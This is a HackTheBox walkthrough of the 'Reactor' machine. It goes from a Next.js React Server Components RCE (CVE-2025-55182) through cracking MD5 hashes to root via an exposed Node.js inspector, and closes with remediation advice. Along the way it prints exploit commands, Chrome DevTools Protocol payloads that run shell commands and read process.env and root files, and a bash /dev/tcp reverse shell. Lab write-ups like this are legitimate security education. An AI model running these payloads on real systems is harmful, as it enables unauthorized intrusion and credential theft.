---
layout: default
title: Reactor
parent: HTB Writeups
nav_order: 1
---

# HTB Reactor

**Machine:** Reactor (Linux) · **Difficulty:** Medium · **Attack surface:** SSH (22), HTTP (3000)

Reactor is a straight line from a headline-grade framework CVE to root, but the fun part is the middle: it buries the real privilege-escalation path under a handful of deliberately tempting dead ends. Getting from "shell as the app user" to "root" is less about exploitation skill and more about not chasing the group membership that *looks* like the vuln.

---

## 1. Recon & Fingerprinting

An nmap scan turns up exactly two open ports: SSH and a web service on 3000. The web root is a fake nuclear-plant monitoring dashboard — **"REACTORWATCH — Core Monitoring System v3.2.1"** — styled convincingly enough to be a distraction in its own right, but the interesting part is underneath it: it's built on **Next.js 15.0.3** using the App Router.

The page source gives this away immediately. Next.js's React Server Components ship their payload as `self.__next_f.push(...)` blocks — serialized "Flight" data containing the dashboard's metrics, logs, and personnel records, all rendered server-side and streamed down as part of the initial HTML. None of it contained credentials, but it confirmed the framework, the App Router usage, and the build ID, which is exactly the fingerprint needed to know whether this box is sitting in a vulnerable version range.

A pass with feroxbuster against `/_next/static/` turned up nothing beyond the expected webpack chunks — no hidden routes, no stray build artifacts. The web app itself wasn't going to be attacked through content discovery; it was going to be attacked through its framework.

---

## 2. Initial Foothold — React2Shell (CVE-2025-55182)

Next.js 15.0.3 falls inside the vulnerable range for **React2Shell (CVE-2025-55182)**, a pre-auth, unauthenticated RCE in React Server Components with a CVSS score of 10.0. It affects the `react-server-dom-*` packages (versions 19.0–19.2.0) and every framework that bundles them — Next.js, React Router, Waku, and others — because the flaw lives in React's own Flight deserialization code, not in anything framework-specific.

The root cause is a missing ownership check. When a client invokes a Server Action, React serializes the reference to it as a string like `module-id#export-name`. On the server, Next.js resolves that by loading the module via `__webpack_require__` and then indexing into its exports object with bracket notation — `moduleExports[name]` — to find the function to call. The bug is that this lookup never verifies the requested name is actually one of the module's *own* declared exports. That means an attacker can request *any* property reachable off that object, including methods inherited from built-in Node modules already present in the bundle — `child_process.execSync`, `fs.readFileSync`, `vm.runInThisContext`, and so on. A crafted Server Action reference is enough to turn "call this component's action" into "call this arbitrary Node API," with attacker-controlled arguments.

For exploitation I used a public proof-of-concept (`exploit-redirect.sh`) built around an HTTP 303 redirect for output exfiltration: rather than dealing with a blind RCE where you have no return channel, the command's output gets reflected back in the response's `Location` header, so each request is self-contained — send a command, read the header, done.

```bash
./exploit-redirect.sh http://10.129.154.181:3000/ "id"
./exploit-redirect.sh http://10.129.154.181:3000/ "ls -la /opt/reactor-app"
```

This returned a shell as the Node application user, running out of `/opt/reactor-app`, with `app/`, `next.config.js`, `package.json`, `reactor.db`, and `.env` all present and readable.

---

## 3. Loot — `.env` and the SQLite Database

The `.env` file in the app directory held the expected environment config, plus two things worth a closer look:

| Key | Value |
|-----|-------|
| `DB_PATH` | `/opt/reactor-app/reactor.db` |
| `DB_TYPE` | `sqlite3` |
| `SENSOR_API_KEY` | `rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k` |
| `ALERT_WEBHOOK` | `https://alerts.internal.reactor.htb/webhook` |
| `NODE_ENV` | `production` |

`SENSOR_API_KEY` looked promising at first, but nothing on the box consumed it outside the app itself, and `ALERT_WEBHOOK` pointed at an internal hostname that was never in `/etc/hosts` and never resolved — both turned out to be flavor text rather than a path forward.

The database pointed to by `DB_PATH` was more useful. Pulling `reactor.db` and opening its `users` table surfaced two accounts:

| id  | username | password_hash (MD5)                | role          |
| --- | -------- | ---------------------------------- | ------------- |
| 1   | admin    | `a203b22191d7xxxxxxxxxa5c101b17b8` | administrator |
| 2   | engineer | `39d97110eafexxxxxxxxx812cd271e8e` | operator      |

Both hashes are unsalted MD5, which is effectively asking to be cracked. John made short work of it:

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show --format=Raw-MD5 hashes.txt
```

`admin`'s hash never fell against rockyou, but `engineer`'s did, and the recovered password worked directly over SSH. That was enough — the admin account's credentials, wherever they actually lived, were never needed for the rest of the chain.

---

## 4. Privesc Triage — Distinguishing Signal from Noise

Once on the box as `engineer`, the usual enumeration pass turned up several things that looked like the intended privilege-escalation path but weren't:

| Finding | Verdict |
| --- | --- |
| `engineer` is a member of the `lxd` group, and `/run/lxd-installer.socket` is writable | **Decoy.** LXD isn't actually installed, and installing it via snap requires outbound internet access, which is blocked from the box. `lxc version` just errors out through the installer shim — there's no running LXD daemon to abuse. |
| `/etc/crontab` and systemd timers | Stock Ubuntu, nothing custom planted. |
| `ALERT_WEBHOOK`'s internal hostname | Unresolvable, as noted above — a loose end left over from the `.env` file, not a lead. |

The actual signal was buried in a `ss -tlnp` listing:

```
LISTEN  127.0.0.1:9229
```

Port 9229 is the default for the Node.js V8 Inspector (`--inspect`). It's loopback-only, and `ss` doesn't show an owning process for it under `engineer`'s session — meaning it belongs to a separate, more privileged Node process running elsewhere on the box. A debug port left open in anything resembling a production environment is almost always exploitable, and this one was no exception.

---

## 5. Root — Node.js Inspector RCE via SSH Tunnel

### The idea

The V8 Inspector speaks the Chrome DevTools Protocol (CDP). Any client that can reach it can issue `Runtime.evaluate` — arbitrary JavaScript execution inside that running Node process — which trivially becomes command execution as whatever user owns it. Since the port is bound to loopback, reaching it from outside the box requires tunneling it through the existing SSH session as `engineer`.

### 5.1 Tunnel the inspector port

```bash
ssh -N -L 9229:127.0.0.1:9229 engineer@10.129.154.181
```

`-N` means no remote command and no shell — the session just sits there holding the tunnel open. That's expected, not a hang; everything else happens from a second terminal. Verify the forward is live with `curl http://127.0.0.1:9229/json`. (To add this forward to an already-open SSH session instead of starting a new one: press Enter to get to a fresh line, then type `~C` to drop into the SSH command line, then `-L 9229:127.0.0.1:9229`.)

### 5.2 Discover the debugger endpoint

```bash
curl -s http://127.0.0.1:9229/json | jq -r '.[0].webSocketDebuggerUrl'
# ws://127.0.0.1:9229/55f079fd-0d26-4eb1-974b-6126050222b2
```

The same `/json` response also includes the inspected process's `title` and script `url`, which is worth noting if you want to review the target app's source afterward.

### 5.3 Attach over WebSocket and evaluate

`websocat` isn't packaged on Debian by default, so the practical options are: `apt install python3-websocket` and drive it from a small Python script, `npx wscat -c <url>` if npm is available, a static `websocat` binary from GitHub releases, or just pointing a desktop Chromium at `chrome://inspect` → Configure → `127.0.0.1:9229` and using the GUI.

I used a small Python REPL that fetches the debugger UUID automatically and handles `awaitPromise` plus error reporting:

```python
#!/usr/bin/env python3
# cdp.py — attach to Node inspector and evaluate JS
import json, urllib.request
from websocket import create_connection

disc = json.load(urllib.request.urlopen("http://127.0.0.1:9229/json"))
ws = create_connection(disc[0]["webSocketDebuggerUrl"])
print(f"[+] attached: {disc[0].get('title','?')} | {disc[0].get('url','?')}")
i = 0
while True:
    expr = input("node> ").strip()
    if not expr: continue
    i += 1
    ws.send(json.dumps({"id": i, "method": "Runtime.evaluate",
        "params": {"expression": expr, "returnByValue": True, "awaitPromise": True}}))
    while True:
        r = json.loads(ws.recv())
        if r.get("id") == i: break
    res = r["result"]
    if "exceptionDetails" in res:
        print("ERR:", res["exceptionDetails"].get("exception", {}).get("description", "")[:400])
    else:
        print(res["result"].get("value"))
```

If you're driving `wscat`/`websocat` directly instead, each line sent over the socket is one CDP message. A sanity check first:

```json
{"id":1,"method":"Runtime.evaluate","params":{"expression":"1+1","returnByValue":true}}
```

And then the actual RCE:

```json
{"id":2,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('id; hostname').toString()","returnByValue":true}}
```

The output lands in `.result.result.value` of the response. If the target process has no `process.mainModule` (ESM-only entry points don't), the dynamic-import fallback works just as well because `awaitPromise: true` is set: `import('child_process').then(cp=>cp.execSync('id').toString())`.

### 5.4 Post-exploitation

From there it's a normal post-exploitation pass, just expressed as JS expressions sent over the socket instead of shell commands:

```js
process.mainModule.require('child_process').execSync('id').toString()      // whoami
process.mainModule.require('child_process').execSync('sudo -l').toString() // privesc paths
process.env                                                                // secrets/creds
process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()
```

Worth checking along the way:
- The actual process owner (`ps aux | grep node` from a normal shell, if you have one) — the RCE runs as whoever owns that Node process, which isn't guaranteed to be `root` on every box built like this one.
- The app source at the `url` reported by `/json`, in case it has hardcoded credentials worth reviewing.
- Any other loopback-only services reachable from the Node host, since this one was.

For anything beyond one-off commands, it's less painful to pop a full reverse shell from the console and work from a real TTY:

```js
process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/<VPN_IP>/4444 0>&1"')
```

### 5.5 Gotchas along the way

A few things cost time during this step and are worth flagging:

- **"SSH just hangs"** — that's `-N` working as intended; no prompt is ever coming, use the second terminal.
- **`~C` prints literally instead of opening the SSH command line** — the escape sequence only works as the first characters typed after a fresh line; press Enter first.
- **The WebSocket UUID looks truncated when copied by eye** — it's just terminal line-wrapping; pull it with `jq` rather than trying to read it off the screen.
- **The UUID changes** every time the inspected process restarts — re-fetch `/json` rather than reusing a cached URL.
- **Connected but no response to `Runtime.evaluate`** — the process was likely started with `--inspect-brk` and is paused at the first line; send `{"id":0,"method":"Debugger.resume"}` first.
- **Connection immediately rejected** — Node's inspector only accepts one debugger client at a time; make sure nothing else (e.g. an open Chromium `chrome://inspect` tab) is still attached.
- **`curl --ws` doesn't work here** — the Debian-packaged curl build doesn't include WebSocket support; don't waste time on it.

---

## 6. Attack Chain Summary

```
nmap: 22 + 3000
   └─ Next.js 15.0.3 (App Router, RSC/webpack)
        └─ CVE-2025-55182 (React2Shell) — pre-auth RCE via Flight module-export resolver
             └─ RCE as the Node app user (redirect-exfil PoC)
                  ├─ .env        → SENSOR_API_KEY, ALERT_WEBHOOK (both dead ends)
                  └─ reactor.db  → MD5 password hashes
                       └─ john (Raw-MD5 + rockyou) → engineer's password
                            └─ SSH as engineer
                                 └─ ss -tlnp → 127.0.0.1:9229 (Node --inspect, not lxd)
                                      └─ SSH tunnel → CDP Runtime.evaluate
                                           └─ root → root.txt
```

---

## 7. Remediation

1. **Upgrade Next.js off 15.0.3.** CVE-2025-55182 is unauthenticated, network-exploitable, and rated CVSS 10.0 — about as bad as a web vulnerability gets. The 15.0.x branch is fixed from 15.0.5 onward; other branches have their own patched releases (15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7), so the fix needs to track whichever minor line is actually deployed, not just "bump to the next patch." Given the severity, this should have triggered an out-of-band patch cycle rather than waiting for a normal release window.
2. **Never run Node with `--inspect` in a production or production-like environment.** This single misconfiguration was the entire path from a low-privilege app-adjacent account to root. If a debugger needs to be attached for troubleshooting, it should be enabled transiently and torn down immediately after — not left listening indefinitely, even on loopback, where any other local account can reach it.
3. **Stop hashing credentials with unsalted MD5.** Both hashes in `reactor.db` were crackable in seconds against a stock rockyou wordlist. At minimum this should be bcrypt/scrypt/argon2 with a per-user salt; MD5 offers essentially no resistance against offline cracking on modern hardware.
4. **Treat `SENSOR_API_KEY` as compromised and rotate it.** It sat in a `.env` file reachable through a remote code execution vulnerability; even though it wasn't the key that led anywhere in this chain, any secret exposed alongside an RCE should be assumed read and rotated as a matter of course.
5. **Audit group memberships against what's actually installed.** `engineer` being in the `lxd` group with no LXD daemon present isn't exploitable today, but it's a standing landmine — the moment someone installs LXD for an unrelated reason, that account escalates to root with zero additional effort. Group membership should match actual need, not leftover provisioning.

---

*Flags obtained: user.txt (as `engineer`), root.txt (root via the Node inspector). All actions performed against an authorized HackTheBox machine.*

Sources on CVE-2025-55182: [Checkmarx](https://checkmarx.com/zero-post/react2shell-cve-2025-55182-deserialization-to-remote-code-execution-in-react-and-next-js/) · [Rapid7](https://www.rapid7.com/blog/post/etr-react2shell-cve-2025-55182-critical-unauthenticated-rce-affecting-react-server-components/) · [Wiz](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182)
